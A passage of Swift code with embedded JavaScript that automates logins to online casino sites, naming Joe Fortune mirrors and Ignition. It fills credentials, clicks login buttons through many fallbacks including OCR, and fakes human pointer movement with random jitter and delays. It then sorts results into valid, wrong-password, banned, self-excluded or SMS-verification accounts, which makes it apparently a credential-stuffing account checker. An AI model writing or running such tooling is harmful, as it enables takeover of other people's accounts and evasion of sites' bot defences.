                    el.dispatchEvent(new PointerEvent('pointerup',{bubbles:true,cancelable:true,view:window,clientX:cx,clientY:cy,pointerId:1,pointerType:'touch'}));
                    el.dispatchEvent(new MouseEvent('click',{bubbles:true,cancelable:true,view:window,clientX:cx,clientY:cy}));
                    return true;
                } catch(e) { return false; }
            }

            function coordClick(el) {
                if (!el) return false;
                try {
                    var rect = el.getBoundingClientRect();
                    var cx = rect.left + rect.width / 2;
                    var cy = rect.top + rect.height / 2;
                    var target = document.elementFromPoint(cx, cy);
                    if (!target) target = el;
                    target.dispatchEvent(new MouseEvent('mousedown',{bubbles:true,cancelable:true,view:window,clientX:cx,clientY:cy,button:0}));
                    target.dispatchEvent(new MouseEvent('mouseup',{bubbles:true,cancelable:true,view:window,clientX:cx,clientY:cy,button:0}));
                    target.dispatchEvent(new MouseEvent('click',{bubbles:true,cancelable:true,view:window,clientX:cx,clientY:cy,button:0}));
                    target.click();
                    return true;
                } catch(e) { return false; }
            }

            function nativeClick(el) {
                if (!el) return false;
                try { el.click(); return true; } catch(e) { return false; }
            }

            function allClicks(el, label) {
                if (!el) return null;
                var preOp = getOpacity(el);
                if (nativeClick(el)) {
                    var postOp = getOpacity(el);
                    if (postOp < preOp - 0.05) return label + ':NATIVE_CONFIRMED';
                }
                if (humanClick(el)) {
                    var postOp2 = getOpacity(el);
                    if (postOp2 < preOp - 0.05) return label + ':HUMAN_CONFIRMED';
                }
                if (touchClick(el)) {
                    var postOp3 = getOpacity(el);
                    if (postOp3 < preOp - 0.05) return label + ':TOUCH_CONFIRMED';
                }
                if (coordClick(el)) return label + ':COORD';
                return label + ':ALL_METHODS';
            }

            var loginTermsExact = ['log in','login','sign in','signin'];
            var loginTermsPartial = ['log in','login','sign in','signin','submit','enter','go'];

            // S1: Exact text match on all clickable elements
            var allClickable = document.querySelectorAll('button, input[type="submit"], a, [role="button"], span, div, label');
            for (var i = 0; i < allClickable.length; i++) {
                var el = allClickable[i];
                var text = (el.textContent || el.value || '').replace(/[ \t\n\r]+/g,' ').toLowerCase().trim();
                if (text.length > 50) continue;
                for (var t = 0; t < loginTermsExact.length; t++) {
                    if (text === loginTermsExact[t]) {
                        var r = allClicks(el, 'S1_EXACT_' + text);
                        if (r) return r;
                    }
                }
            }

            // S2: Partial text match on all clickable elements
            for (var i = 0; i < allClickable.length; i++) {
                var el = allClickable[i];
                var text = (el.textContent || el.value || '').replace(/[ \t\n\r]+/g,' ').toLowerCase().trim();
                if (text.length > 80) continue;
                for (var t = 0; t < loginTermsPartial.length; t++) {
                    if (text.indexOf(loginTermsPartial[t]) !== -1 && text.length < 30) {
                        var r = allClicks(el, 'S2_PARTIAL_' + loginTermsPartial[t]);
                        if (r) return r;
                    }
                }
            }

            // S3: Class/ID based selectors common on Joe Fortune mirrors
            var classSelectors = [
                '[class*="login"][class*="btn"]','[class*="login"][class*="button"]',
                '[class*="sign"][class*="btn"]','[class*="sign"][class*="button"]',
                '[class*="submit"][class*="btn"]','[class*="submit"][class*="button"]',
                '[class*="loginBtn"]','[class*="login-btn"]','[class*="login_btn"]',
                '[class*="signInBtn"]','[class*="signin-btn"]','[class*="signin_btn"]',
                '[class*="btn-login"]','[class*="btn-signin"]','[class*="btn-submit"]',
                '[class*="button-login"]','[class*="button-signin"]',
                '[id*="login"][id*="btn"]','[id*="login"][id*="button"]',
                '[id*="signin"][id*="btn"]','[id*="submit"][id*="btn"]',
                '#loginButton','#loginBtn','#login-button','#login-btn',
                '#signInButton','#signInBtn','#submitBtn','#submitButton',
                '#btn-login','#btn-signin','#btn-submit',
                'button.login','button.signin','button.submit',
                '[data-action="login"]','[data-action="signin"]','[data-action="submit"]',
                '[data-type="login"]','[data-type="submit"]',
                '[data-testid*="login"]','[data-testid*="submit"]',
                '[data-qa*="login"]','[data-qa*="submit"]',
                '[aria-label*="Log In"]','[aria-label*="Login"]','[aria-label*="Sign In"]',
                '[aria-label*="log in"]','[aria-label*="login"]','[aria-label*="sign in"]',
                '[title*="Log In"]','[title*="Login"]','[title*="Sign In"]'
            ];
            for (var s = 0; s < classSelectors.length; s++) {
                try {
                    var el = document.querySelector(classSelectors[s]);
                    if (el) {
                        var r = allClicks(el, 'S3_CLASS_' + classSelectors[s].substring(0,30));
                        if (r) return r;
                    }
                } catch(e) {}
            }

            // S4: button[type=submit] or input[type=submit] inside form with password
            var forms = document.querySelectorAll('form');
            for (var f = 0; f < forms.length; f++) {
                if (forms[f].querySelector('input[type="password"]')) {
                    var formBtn = forms[f].querySelector('button[type="submit"]') || forms[f].querySelector('input[type="submit"]') || forms[f].querySelector('button');
                    if (formBtn) {
                        var r = allClicks(formBtn, 'S4_FORM_BTN');
                        if (r) return r;
                    }
                }
            }

            // S5: Any button[type=submit] or input[type=submit] on page
            var submitBtn = document.querySelector('button[type="submit"]');
            if (submitBtn) {
                var r = allClicks(submitBtn, 'S5_SUBMIT_BTN');
                if (r) return r;
            }
            var submitInput = document.querySelector('input[type="submit"]');
            if (submitInput) {
                var r = allClicks(submitInput, 'S5_SUBMIT_INPUT');
                if (r) return r;
            }

            // S6: Last resort — any button near password field
            var passField = document.querySelector('input[type="password"]');
            if (passField) {
                var parent = passField.parentElement;
                for (var depth = 0; depth < 6 && parent; depth++) {
                    var btns = parent.querySelectorAll('button, [role="button"], a.btn, input[type="submit"]');
                    for (var b = 0; b < btns.length; b++) {
                        var text = (btns[b].textContent || btns[b].value || '').toLowerCase().trim();
                        if (btns[b].tagName === 'INPUT' && btns[b].type === 'password') continue;
                        if (text.length < 40) {
                            var r = allClicks(btns[b], 'S6_NEAR_PASS_' + text.substring(0,15));
                            if (r) return r;
                        }
                    }
                    parent = parent.parentElement;
                }
            }

            return 'NOT_FOUND';
        })();
        """
        var result = await executeJS(megaClickJS)
        if let result, result != "NOT_FOUND" {
            return (true, "Login clicked: \(result)")
        }

        let enterResult = await pressEnterOnPasswordField()
        if enterResult.success {
            return (true, "Login via Enter key after button not found")
        }

        let formSubmitJS = """
        (function() {
            var forms = document.querySelectorAll('form');
            for (var i = 0; i < forms.length; i++) {
                var hasPassword = forms[i].querySelector('input[type="password"]');
                if (hasPassword) {
                    try { forms[i].requestSubmit(); return 'REQUEST_SUBMIT_FORM'; } catch(e) {}
                    try { forms[i].submit(); return 'SUBMIT_FORM'; } catch(e) {}
                }
            }
            if (forms.length > 0) {
                try { forms[0].requestSubmit(); return 'REQUEST_SUBMIT_FIRST'; } catch(e) {}
                try { forms[0].submit(); return 'SUBMIT_FIRST'; } catch(e) {}
            }
            return 'NOT_FOUND';
        })();
        """
        result = await executeJS(formSubmitJS)
        if let result, result != "NOT_FOUND" {
            return (true, "Login via form submit: \(result)")
        }

        let ocrResult = await ocrClickLoginButton()
        if ocrResult.success {
            return (true, "Login via OCR: \(ocrResult.detail)")
        }

        return (false, "Login button not found after all strategies + OCR")
    }

    func ocrClickLoginButton() async -> (success: Bool, detail: String) {
        guard let webView else { return (false, "No WebView") }
        guard let screenshot = await captureScreenshot() else { return (false, "Screenshot failed") }
        guard let cgImage = screenshot.cgImage else { return (false, "CGImage conversion failed") }

        let viewBounds = webView.bounds
        let imageWidth = CGFloat(cgImage.width)
        let imageHeight = CGFloat(cgImage.height)

        let request = VNRecognizeTextRequest()
        request.recognitionLevel = .accurate
        request.usesLanguageCorrection = false
        request.customWords = ["LOGIN", "Log In", "SIGN IN", "Sign In", "LOG IN"]

        let handler = VNImageRequestHandler(cgImage: cgImage, options: [:])
        do {
            try handler.perform([request])
        } catch {
            return (false, "Vision OCR failed: \(error.localizedDescription)")
        }

        guard let observations = request.results else { return (false, "No OCR results") }

        let loginTerms = ["log in", "login", "sign in", "signin"]
        var bestMatch: (observation: VNRecognizedTextObservation, text: String)?

        for observation in observations {
            guard let candidate = observation.topCandidates(1).first else { continue }
            let text = candidate.string.lowercased().trimmingCharacters(in: .whitespacesAndNewlines)
            if text.count > 20 { continue }
            for term in loginTerms {
                if text == term || text.contains(term) {
                    bestMatch = (observation, candidate.string)
                    break
                }
            }
            if bestMatch != nil { break }
        }

        guard let match = bestMatch else { return (false, "OCR: no LOGIN text found in \(observations.count) observations") }

        let boundingBox = match.observation.boundingBox
        let normalizedCenterX = boundingBox.midX
        let normalizedCenterY = 1.0 - boundingBox.midY

        let pixelX = normalizedCenterX * imageWidth
        let pixelY = normalizedCenterY * imageHeight

        let scaleX = viewBounds.width / imageWidth
        let scaleY = viewBounds.height / imageHeight
        let viewX = pixelX * scaleX
        let viewY = pixelY * scaleY

        let randOffsetX = CGFloat.random(in: -3...3)
        let randOffsetY = CGFloat.random(in: -3...3)
        let targetX = viewX + randOffsetX
        let targetY = viewY + randOffsetY

        let holdDuration = Int.random(in: 60...220)

        let humanMoveJS = """
        (function() {
            var cx = \(targetX);
            var cy = \(targetY);
            var el = document.elementFromPoint(cx, cy);
            if (!el) return 'NO_ELEMENT_AT_COORDS';

            function jitter(v, range) { return v + (Math.random() * range * 2 - range); }

            var steps = 3 + Math.floor(Math.random() * 3);
            var startX = cx + (Math.random() * 40 - 20);
            var startY = cy + (Math.random() * 40 - 20);
            for (var i = 0; i <= steps; i++) {
                var t = i / steps;
                var mx = startX + (cx - startX) * t + (Math.random() * 2 - 1);
                var my = startY + (cy - startY) * t + (Math.random() * 2 - 1);
                try {
                    el.dispatchEvent(new PointerEvent('pointermove', {bubbles:true,clientX:mx,clientY:my,pointerId:1,pointerType:'mouse'}));
                    el.dispatchEvent(new MouseEvent('mousemove', {bubbles:true,clientX:mx,clientY:my}));
                } catch(e) {}
            }

            try {
                el.dispatchEvent(new PointerEvent('pointerover', {bubbles:true,clientX:cx,clientY:cy,pointerId:1,pointerType:'mouse'}));
                el.dispatchEvent(new MouseEvent('mouseover', {bubbles:true,clientX:cx,clientY:cy}));
                el.dispatchEvent(new PointerEvent('pointerenter', {bubbles:false,clientX:cx,clientY:cy,pointerId:1,pointerType:'mouse'}));
                el.dispatchEvent(new MouseEvent('mouseenter', {bubbles:false,clientX:cx,clientY:cy}));
            } catch(e) {}

            el.dispatchEvent(new PointerEvent('pointerdown', {bubbles:true,cancelable:true,view:window,clientX:jitter(cx,1),clientY:jitter(cy,1),pointerId:1,pointerType:'mouse',button:0,buttons:1}));
            el.dispatchEvent(new MouseEvent('mousedown', {bubbles:true,cancelable:true,view:window,clientX:jitter(cx,1),clientY:jitter(cy,1),button:0,buttons:1}));

            el.dispatchEvent(new PointerEvent('pointerup', {bubbles:true,cancelable:true,view:window,clientX:jitter(cx,1.5),clientY:jitter(cy,1.5),pointerId:1,pointerType:'mouse',button:0}));
            el.dispatchEvent(new MouseEvent('mouseup', {bubbles:true,cancelable:true,view:window,clientX:jitter(cx,1.5),clientY:jitter(cy,1.5),button:0}));
            el.dispatchEvent(new MouseEvent('click', {bubbles:true,cancelable:true,view:window,clientX:jitter(cx,1),clientY:jitter(cy,1),button:0}));

            el.focus();
            try { el.click(); } catch(e) {}

            var tag = el.tagName || 'unknown';
            var text = (el.textContent || el.value || '').substring(0, 30).trim();
            return 'OCR_CLICKED:' + tag + ':' + text;
        })();
        """

        try? await Task.sleep(for: .milliseconds(Int.random(in: 30...120)))

        let result = await executeJS(humanMoveJS)
        if let result, result.hasPrefix("OCR_CLICKED") {
            try? await Task.sleep(for: .milliseconds(holdDuration))
            return (true, "\(result) at (\(Int(targetX)),\(Int(targetY))) text='\(match.text)' hold=\(holdDuration)ms")
        }

        return (false, "OCR element interaction failed: \(result ?? "nil")")
    }

    func verifyClickRegistered(timeout: TimeInterval = 90) async -> (registered: Bool, detail: String) {
        let timeout = TimeoutResolver.resolveAutomationTimeout(timeout)
        let js = """
        (function() {
            var terms = ['log in','login','sign in','signin'];
            var btns = document.querySelectorAll('button, input[type="submit"], a, [role="button"]');
            for (var i = 0; i < btns.length; i++) {
                var text = (btns[i].textContent || btns[i].value || '').toLowerCase().trim();
                var isLoginBtn = false;
                for (var t = 0; t < terms.length; t++) { if (text.indexOf(terms[t]) !== -1 && text.length < 30) isLoginBtn = true; }
                if (!isLoginBtn && btns[i].type !== 'submit') continue;
                var style = window.getComputedStyle(btns[i]);
                var opacity = parseFloat(style.opacity);
                var disabled = btns[i].disabled;
                var pointer = style.pointerEvents;
                var loading = btns[i].classList.toString().toLowerCase();
                var hasSpinner = btns[i].querySelector('.spinner, .loading, [class*="spin"], [class*="load"]') !== null;
                if (opacity < 0.85 || disabled || pointer === 'none' || loading.indexOf('loading') !== -1 || loading.indexOf('disabled') !== -1 || hasSpinner) {
                    return JSON.stringify({registered:true, opacity:opacity, disabled:disabled, pointer:pointer, hasSpinner:hasSpinner, text:text});
                }
            }
            return JSON.stringify({registered:false});
        })();
        """
        let start = Date()
        while Date().timeIntervalSince(start) < timeout {
            if let raw = await executeJS(js),
               let data = raw.data(using: .utf8),
               let json = try? JSONSerialization.jsonObject(with: data) as? [String: Any],
               let registered = json["registered"] as? Bool, registered {
                let opacity = json["opacity"] as? Double ?? 1.0
                return (true, "opacity:\(String(format: "%.2f", opacity))")
            }
            try? await Task.sleep(for: .milliseconds(300))
        }
        return (false, "Button still opaque after \(Int(timeout))s")
    }

    func pressEnterOnPasswordField() async -> (success: Bool, detail: String) {
        let js = """
        (function() {
            var passwordField = document.querySelector('input[type="password"]');
            if (!passwordField) return 'NO_PASSWORD_FIELD';
            passwordField.focus();
            passwordField.dispatchEvent(new KeyboardEvent('keydown', {key:'Enter',code:'Enter',keyCode:13,which:13,bubbles:true,cancelable:true}));
            passwordField.dispatchEvent(new KeyboardEvent('keypress', {key:'Enter',code:'Enter',keyCode:13,which:13,bubbles:true,cancelable:true}));
            passwordField.dispatchEvent(new KeyboardEvent('keyup', {key:'Enter',code:'Enter',keyCode:13,which:13,bubbles:true}));
            return 'ENTER_PRESSED';
        })();
        """
        let result = await executeJS(js)
        if result == "ENTER_PRESSED" {
            return (true, "Enter key pressed on password field")
        }
        return (false, "Could not press enter: \(result ?? "nil")")
    }

    func dismissCookieNotices() async {
        let js = """
        (function() {
            var dismissed = 0;
            var selectors = [
                '[class*="cookie"] button', '[id*="cookie"] button',
                '[class*="consent"] button', '[id*="consent"] button',
                '[class*="Cookie"] button', '[id*="Cookie"] button',
                '[class*="gdpr"] button', '[id*="gdpr"] button',
                '[class*="notice"] button[class*="accept"]',
                '[class*="notice"] button[class*="close"]',
                '[class*="banner"] button[class*="accept"]',
                '[class*="banner"] button[class*="close"]',
                '[aria-label*="cookie"]', '[aria-label*="Cookie"]',
                '[aria-label*="consent"]', '[aria-label*="accept"]',
                'button[class*="accept"]', 'a[class*="accept"]',
                'button[id*="accept"]', 'a[id*="accept"]',
                '.cc-dismiss', '.cc-allow', '.cc-btn',
                '#onetrust-accept-btn-handler',
                '.cookie-notice .btn', '.cookie-bar .btn',
                '[data-cookie-accept]', '[data-consent-accept]'
            ];
            var acceptTerms = ['accept', 'agree', 'ok', 'got it', 'i agree', 'allow', 'dismiss',
                               'close', 'continue', 'yes', 'confirm', 'understood', 'i understand'];
            for (var s = 0; s < selectors.length; s++) {
                var els = document.querySelectorAll(selectors[s]);
                for (var i = 0; i < els.length; i++) {
                    var text = (els[i].textContent || els[i].value || '').toLowerCase().trim();
                    for (var a = 0; a < acceptTerms.length; a++) {
                        if (text.indexOf(acceptTerms[a]) !== -1 || text.length < 20) {
                            try { els[i].click(); dismissed++; } catch(e) {}
                            break;
                        }
                    }
                }
            }
            var overlays = document.querySelectorAll('[class*="cookie-overlay"], [class*="consent-overlay"], [class*="cookie-backdrop"]');
            for (var o = 0; o < overlays.length; o++) {
                try { overlays[o].style.display = 'none'; dismissed++; } catch(e) {}
            }
            var modals = document.querySelectorAll('[class*="cookie-modal"], [class*="consent-modal"], [class*="cookie-popup"], [class*="cookie-banner"]');
            for (var m = 0; m < modals.length; m++) {
                try { modals[m].style.display = 'none'; dismissed++; } catch(e) {}
            }
            return dismissed;
        })();
        """
        _ = await executeJS(js)
    }

    func getFieldValues() async -> (email: String, password: String) {
        let js = """
        (function() {
            var emailEl = document.querySelector('input[type="email"]') || document.querySelector('input[autocomplete="email"]') || document.querySelector('input[autocomplete="username"]') || document.querySelector('#email') || document.querySelector('input[type="text"]');
            var passEl = document.querySelector('input[type="password"]') || document.querySelector('#login-password');
            var e = emailEl ? emailEl.value : '';
            var p = passEl ? passEl.value : '';
            return JSON.stringify({e: e, p: p});
        })();
        """
        let result = await executeJS(js)
        guard let result, let data = result.data(using: .utf8) else { return ("", "") }
        struct FieldVals: Decodable { let e: String; let p: String }
        guard let vals = try? JSONDecoder().decode(FieldVals.self, from: data) else { return ("", "") }
        return (vals.e, vals.p)
    }

    func clearEmailFieldOnly() async {
        let js = """
        (function() {
            var ns = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value');
            var selectors = 'input[type="email"], input[type="text"], input[autocomplete="email"], input[autocomplete="username"], #email';
            var fields = document.querySelectorAll(selectors);
            var cleared = 0;
            var seen = new Set();
            for (var i = 0; i < fields.length; i++) {
                var el = fields[i];
                if (seen.has(el)) continue;
                if (el.type === 'password') continue;
                seen.add(el);
                el.focus();
                if (ns && ns.set) { ns.set.call(el, ''); } else { el.value = ''; }
                el.dispatchEvent(new Event('input', {bubbles: true}));
                el.dispatchEvent(new Event('change', {bubbles: true}));
                cleared++;
            }
            return 'CLEARED_EMAIL_' + cleared;
        })();
        """
        _ = await executeJS(js)
    }

    func clearPasswordFieldOnly() async {
        let js = """
        (function() {
            var ns = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value');
            var fields = document.querySelectorAll('input[type="password"], #login-password');
            var cleared = 0;
            var seen = new Set();
            for (var i = 0; i < fields.length; i++) {
                var el = fields[i];
                if (seen.has(el)) continue;
                seen.add(el);
                el.focus();
                if (ns && ns.set) { ns.set.call(el, ''); } else { el.value = ''; }
                el.dispatchEvent(new Event('input', {bubbles: true}));
                el.dispatchEvent(new Event('change', {bubbles: true}));
                cleared++;
            }
            return 'CLEARED_PASS_' + cleared;
        })();
        """
        _ = await executeJS(js)
    }

    func clearAllInputFields() async {
        let js = """
        (function() {
            var ns = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value');
            var fields = document.querySelectorAll('input[type="email"], input[type="text"], input[type="password"], input[autocomplete="email"], input[autocomplete="username"], input[autocomplete="current-password"], #email, #login-password');
            var cleared = 0;
            var seen = new Set();
            for (var i = 0; i < fields.length; i++) {
                var el = fields[i];
                if (seen.has(el)) continue;
                seen.add(el);
                if (el.value && el.value.length > 0) {
                    el.focus();
                    if (ns && ns.set) { ns.set.call(el, ''); } else { el.value = ''; }
                    el.dispatchEvent(new Event('input', {bubbles: true}));
                    el.dispatchEvent(new Event('change', {bubbles: true}));
                    cleared++;
                }
            }
            return 'CLEARED_' + cleared;
        })();
        """
        _ = await executeJS(js)
    }

    func preSaveCredentials(username: String, password: String) async {
        let escapedUser = username.replacingOccurrences(of: "\\", with: "\\\\").replacingOccurrences(of: "'", with: "\\'")
        let escapedPass = password.replacingOccurrences(of: "\\", with: "\\\\").replacingOccurrences(of: "'", with: "\\'")
        let js = """
        (function() {
            var emailFields = document.querySelectorAll('input[type="email"], input[type="text"], input[autocomplete="email"], input[autocomplete="username"]');
            var passFields = document.querySelectorAll('input[type="password"]');
            var ns = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value');
            for (var i = 0; i < emailFields.length; i++) {
                var el = emailFields[i];
                try {
                    el.focus();
                    el.click();
                    var rect = el.getBoundingClientRect();
                    var cx = rect.left + rect.width * (0.3 + Math.random() * 0.4);
                    var cy = rect.top + rect.height * (0.3 + Math.random() * 0.4);
                    el.dispatchEvent(new MouseEvent('mousedown', {bubbles:true,clientX:cx,clientY:cy}));
                    el.dispatchEvent(new MouseEvent('mouseup', {bubbles:true,clientX:cx,clientY:cy}));
                    el.dispatchEvent(new MouseEvent('click', {bubbles:true,clientX:cx,clientY:cy}));
                    el.dispatchEvent(new Event('focus', {bubbles:true}));
                    if (ns && ns.set) { ns.set.call(el, ''); } else { el.value = ''; }
                    el.dispatchEvent(new Event('input', {bubbles:true}));
                    if (ns && ns.set) { ns.set.call(el, '\(escapedUser)'); }
                    else { el.value = '\(escapedUser)'; }
                    el.dispatchEvent(new Event('input', {bubbles:true}));
                    el.dispatchEvent(new Event('change', {bubbles:true}));
                } catch(e) {}
            }
            for (var i = 0; i < passFields.length; i++) {
                var el = passFields[i];
                try {
                    el.focus();
                    el.click();
                    var rect = el.getBoundingClientRect();
                    var cx = rect.left + rect.width * (0.3 + Math.random() * 0.4);
                    var cy = rect.top + rect.height * (0.3 + Math.random() * 0.4);
                    el.dispatchEvent(new MouseEvent('mousedown', {bubbles:true,clientX:cx,clientY:cy}));
                    el.dispatchEvent(new MouseEvent('mouseup', {bubbles:true,clientX:cx,clientY:cy}));
                    el.dispatchEvent(new MouseEvent('click', {bubbles:true,clientX:cx,clientY:cy}));
                    el.dispatchEvent(new Event('focus', {bubbles:true}));
                    if (ns && ns.set) { ns.set.call(el, ''); } else { el.value = ''; }
                    el.dispatchEvent(new Event('input', {bubbles:true}));
                    if (ns && ns.set) { ns.set.call(el, '\(escapedPass)'); }
                    else { el.value = '\(escapedPass)'; }
                    el.dispatchEvent(new Event('input', {bubbles:true}));
                    el.dispatchEvent(new Event('change', {bubbles:true}));
                } catch(e) {}
            }
        })();
        """
        _ = await executeJS(js)
    }

    func waitForLoginButtonReady(timeout: TimeInterval = 90) async -> (ready: Bool, timedOut: Bool) {
        let timeout = TimeoutResolver.resolveAutomationTimeout(timeout)
        let start = Date()
        while Date().timeIntervalSince(start) < timeout {
            let check = await checkLoginButtonReadiness()
            if check.isReady { return (true, false) }
            try? await Task.sleep(for: .milliseconds(500))
        }
        return (false, true)
    }

    func verifyLoginFieldsExist() async -> (found: Int, missing: [String]) {
        let js = """
        (function() {
            \(findFieldJS)
            var fieldDefs = {
                'username': [{"type":"id","value":"email"},{"type":"id","value":"username"},{"type":"name","value":"email"},{"type":"name","value":"username"},{"type":"css","value":"input[type='email']"},{"type":"css","value":"input[type='text']"},{"type":"placeholder","value":"Email"},{"type":"placeholder","value":"Username"}],
                'password': [{"type":"id","value":"password"},{"type":"name","value":"password"},{"type":"css","value":"input[type='password']"},{"type":"placeholder","value":"Password"}]
            };
            var found = 0; var missing = [];
            for (var name in fieldDefs) {
                var el = findField(fieldDefs[name]);
                if (el) { found++; }
                else { missing.push(name); }
            }
            return JSON.stringify({found: found, missing: missing});
        })();
        """
        guard let result = await executeJS(js),
              let data = result.data(using: .utf8),
              let json = try? JSONSerialization.jsonObject(with: data) as? [String: Any],
              let found = json["found"] as? Int,
              let missing = json["missing"] as? [String] else {
            return (0, ["username", "password"])
        }
        return (found, missing)
    }

    struct RapidPollResult {
        let welcomeTextFound: Bool
        let welcomeContext: String?
        let welcomeScreenshot: UIImage?
        let redirectedToHomepage: Bool
        let finalURL: String
        let finalPageContent: String
        let navigationDetected: Bool
        let anyContentChange: Bool
        let errorBannerDetected: Bool
        let errorBannerText: String?
        let smsNotificationDetected: Bool
        let smsNotificationText: String?
    }

    func rapidWelcomePoll(timeout: TimeInterval = 90, originalURL: String) async -> RapidPollResult {
        let timeout = TimeoutResolver.resolveAutomationTimeout(timeout)
        let start = Date()
        let originalHost = URL(string: originalURL)?.host ?? ""
        var welcomeScreenshot: UIImage? = nil
        var welcomeContext: String? = nil
        var welcomeFound = false
        var redirectedHome = false
        var navDetected = false
        var contentChanged = false
        var lastContent = ""
        var lastURL = originalURL

        let originalBody = await executeJS("document.body ? document.body.innerText.substring(0, 300) : ''") ?? ""

        while Date().timeIntervalSince(start) < timeout {
            try? await Task.sleep(for: .milliseconds(200))

            let currentURL = webView?.url?.absoluteString ?? ""
            lastURL = currentURL

            let currentURLLower = currentURL.lowercased()
            let currentHost = URL(string: currentURL)?.host ?? ""
            let sameHost = currentHost == originalHost || currentHost.contains(originalHost.replacingOccurrences(of: "www.", with: "")) || originalHost.contains(currentHost.replacingOccurrences(of: "www.", with: ""))

            if currentURL != originalURL && !currentURL.isEmpty {
                navDetected = true
                if sameHost && !currentURLLower.contains("/login") && !currentURLLower.contains("/signin") {
                    redirectedHome = true
                }
            }

            let pageText = await executeJS("document.body ? document.body.innerText.substring(0, 2000) : ''") ?? ""
            lastContent = pageText
            if pageText != originalBody && pageText.count > 20 {
                contentChanged = true
            }

            let trueDetectionMarkers = ["balance", "wallet", "my account", "logout"]
            let pageTextLower = pageText.lowercased()
            var trueDetectionHit = false
            for marker in trueDetectionMarkers {
                if pageTextLower.contains(marker) {
                    trueDetectionHit = true
                    welcomeFound = true
                    welcomeContext = "TRUE DETECTION marker: \(marker)"
                    welcomeScreenshot = await captureScreenshot()
                    break
                }
            }
            if trueDetectionHit { break }

            if pageText.contains("Welcome!") {
                welcomeFound = true
                let result = GreenBannerDetector.detectWelcomeText(in: pageText)
                welcomeContext = result.exact
                welcomeScreenshot = await captureScreenshot()
                break
            }

            if redirectedHome {
                try? await Task.sleep(for: .milliseconds(500))
                let postRedirectText = await executeJS("document.body ? document.body.innerText.substring(0, 2000) : ''") ?? ""
                lastContent = postRedirectText
                let postLower = postRedirectText.lowercased()
                for marker in ["balance", "wallet", "my account", "logout"] {
                    if postLower.contains(marker) {
                        welcomeFound = true
                        welcomeContext = "TRUE DETECTION marker post-redirect: \(marker)"
                        welcomeScreenshot = await captureScreenshot()
                        break
                    }
                }
                if !welcomeFound && postRedirectText.contains("Welcome!") {
                    welcomeFound = true
                    let result = GreenBannerDetector.detectWelcomeText(in: postRedirectText)
                    welcomeContext = result.exact
                    welcomeScreenshot = await captureScreenshot()
                }
                break
            }

            let contentLower = pageText.lowercased()

            let disabledBannerTerms = [
                "account has been disabled", "your account has been disabled",
                "has been disabled", "account is disabled",
                "account has been suspended", "has been suspended",
                "account has been blocked", "has been blocked",
                "account has been deactivated", "permanently banned",
                "account is closed", "self-excluded",
                "contact customer service", "your account is locked",
                "account is restricted", "permanently disabled"
            ]
            for term in disabledBannerTerms {
                if contentLower.contains(term) && contentChanged {
                    let context = pageText.components(separatedBy: .newlines)
                        .first { $0.lowercased().contains(term) } ?? term
                    return RapidPollResult(
                        welcomeTextFound: false,
                        welcomeContext: nil,
                        welcomeScreenshot: nil,
                        redirectedToHomepage: false,
                        finalURL: lastURL,
                        finalPageContent: lastContent,
                        navigationDetected: navDetected,
                        anyContentChange: contentChanged,
                        errorBannerDetected: true,
                        errorBannerText: context.trimmingCharacters(in: .whitespacesAndNewlines),
                        smsNotificationDetected: false,
                        smsNotificationText: nil
                    )
                }
            }

            let isIgnitionSite = lastURL.lowercased().contains("ignition")
            if isIgnitionSite && contentChanged {
                let smsKeywords = [
                    "sms", "text message", "verification code", "verify your phone",
                    "send code", "sent a code", "enter the code", "phone verification",
                    "mobile verification", "confirm your number", "we sent", "code sent",
                    "enter code", "security code sent", "check your phone"
                ]
                for keyword in smsKeywords {
                    if contentLower.contains(keyword) {
                        let smsContext = pageText.components(separatedBy: .newlines)
                            .first { $0.lowercased().contains(keyword) } ?? keyword
                        return RapidPollResult(
                            welcomeTextFound: false,
                            welcomeContext: nil,
                            welcomeScreenshot: nil,
                            redirectedToHomepage: false,
                            finalURL: lastURL,
                            finalPageContent: lastContent,
                            navigationDetected: navDetected,
                            anyContentChange: contentChanged,
                            errorBannerDetected: false,
                            errorBannerText: nil,
                            smsNotificationDetected: true,
                            smsNotificationText: smsContext.trimmingCharacters(in: .whitespacesAndNewlines)
                        )
                    }
                }
            }

            if contentChanged {
                let redBannerJS = """
                (function(){
                    var sels=['.error-banner','.alert-danger','.alert-error','.login-error','.notification-error',"[role='alert']"];
                    for(var i=0;i<sels.length;i++){
                        var el=document.querySelector(sels[i]);
                        if(!el||el.offsetParent===null)continue;
                        var style=window.getComputedStyle(el);
                        var bg=style.backgroundColor||'';
                        var m=bg.match(/rgba?\\((\\d+),\\s*(\\d+),\\s*(\\d+)/);
                        var isRed=false;
                        if(m){var r=parseInt(m[1]),g=parseInt(m[2]),b=parseInt(m[3]);isRed=r>140&&g<80&&b<80;}
                        if(!isRed){var p=el.parentElement;for(var j=0;j<3&&p;j++){var ps=window.getComputedStyle(p).backgroundColor||'';var pm=ps.match(/rgba?\\((\\d+),\\s*(\\d+),\\s*(\\d+)/);if(pm){var pr=parseInt(pm[1]),pg=parseInt(pm[2]),pb=parseInt(pm[3]);if(pr>140&&pg<80&&pb<80){isRed=true;break;}}p=p.parentElement;}}
                        if(!isRed)continue;
                        var text=(el.textContent||'').trim();
                        if(/error/i.test(text))return'RED_BANNER:'+text.substring(0,200);
                    }
                    return'NONE';
                })();
                """
                let bannerResult = await executeJS(redBannerJS)
                if let bannerResult, bannerResult.hasPrefix("RED_BANNER:") {
                    let bannerText = String(bannerResult.dropFirst(11))
                    return RapidPollResult(
                        welcomeTextFound: false,
                        welcomeContext: nil,
                        welcomeScreenshot: nil,
                        redirectedToHomepage: false,
                        finalURL: lastURL,
                        finalPageContent: lastContent,
                        navigationDetected: navDetected,
                        anyContentChange: contentChanged,
                        errorBannerDetected: true,
                        errorBannerText: bannerText.trimmingCharacters(in: .whitespacesAndNewlines),
                        smsNotificationDetected: false,
                        smsNotificationText: nil
                    )
                }
            }

            let failIndicators = ["incorrect", "invalid", "wrong password", "authentication failed",
                                  "login failed", "not recognized", "disabled", "blocked",
                                  "blacklist", "locked", "suspended", "banned",
                                  "temporarily", "too many attempts", "try again"]
            for indicator in failIndicators {
                if contentLower.contains(indicator) && contentChanged {
                    return RapidPollResult(
                        welcomeTextFound: false,
                        welcomeContext: nil,
                        welcomeScreenshot: nil,
                        redirectedToHomepage: false,
                        finalURL: lastURL,
                        finalPageContent: lastContent,
                        navigationDetected: navDetected,
                        anyContentChange: contentChanged,
                        errorBannerDetected: false,
